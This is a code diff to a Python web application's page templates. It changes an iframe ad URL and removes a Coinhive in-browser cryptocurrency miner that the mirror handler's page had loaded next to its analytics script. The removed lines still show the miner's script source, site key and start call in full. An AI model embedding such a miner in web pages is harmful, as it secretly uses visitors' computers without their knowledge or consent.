@@ -198,7 +198,7 @@ class HomeHandler(BaseHandler):
 
 add_code = """"""
 
-big_add_code = """<iframe style="min-width:600px;min-height:800px;width:100%;border:none" src="http://www.addictingwordgames.com">
+big_add_code = """<iframe style="min-width:600px;min-height:300px;width:100%;border:none" src="http://v5games.com/">
     </iframe>"""
 
 def request_blocker(fiddle_name):
@@ -324,11 +324,6 @@ class MirrorHandler(BaseHandler):
     ga('require', 'displayfeatures');
     ga('send', 'pageview');
 
-</script>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('6Pmr1JGjPBy0DiEr0iCNgiSQVHFiSN6P');
-	miner.start();
 </script>
 """
                                     +
